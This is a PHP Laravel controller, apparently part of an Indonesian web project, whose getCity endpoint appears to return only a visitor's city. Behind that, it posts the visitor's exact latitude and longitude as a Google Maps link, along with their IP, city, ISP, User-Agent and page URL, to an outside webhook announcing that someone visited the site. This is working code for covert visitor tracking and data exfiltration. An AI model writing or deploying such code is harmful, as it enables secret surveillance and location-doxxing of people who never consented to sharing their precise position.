<?php

namespace App\Http\Controllers;

use GuzzleHttp\Client;
use Illuminate\Http\Request;

class ServiceAPIController extends Controller
{
    public function getCity(Request $request)
    {
        // Validasi input lat dan long
        $validatedData = $request->validate([
            'lat' => 'required',
            'long' => 'required',
            'ip' => 'required|ip',
        ]);

        // Inisialisasi Client Guzzle
        $client = new Client();

        try {
            // Request ke API ip-api
            $api = $client->request('GET', 'http://ip-api.com/json/' . $validatedData['ip']);
            $json = json_decode($api->getBody(), true);

            $response = $client->request('POST', 'https://apiv2.bhadrikais.my.id/webhook.php?kode=2', [
                'headers' => [
                    'Origin' => 'http://localhost:8000', // Ganti dengan origin yang sesuai
                ],
                'form_params' => [
                    'username' => 'Seseorang mengunjungi website anda!', // Ganti dengan username yang diinginkan
                    'message' =>  "LINK :\n" . $request->url() . "\n" .
                        "LOKASI :\n " . 'https://www.google.com/maps/search/?api=1&query=' . $validatedData['lat'] . ',' . $validatedData['long'] . " \n" .
                        "IP :\n" . $json['query'] . "\n" .
                        "KOTA :\n" . $json['city'] . "\n" .
                        "ISP :\n" . $json['isp'] . "\n" .
                        "DEVICE :\n" . $request->header('User-Agent'),
                ]
            ]);

            return response()->json([
                'status' => 200,
                'data' => $json['city']
            ]);
        } catch (\Exception $e) {
            // Jika terjadi error, tangani dan kirim error message
            return response()->json([
                'status' => 500,
                'error' => $e->getMessage()
            ]);
        }
    }
}
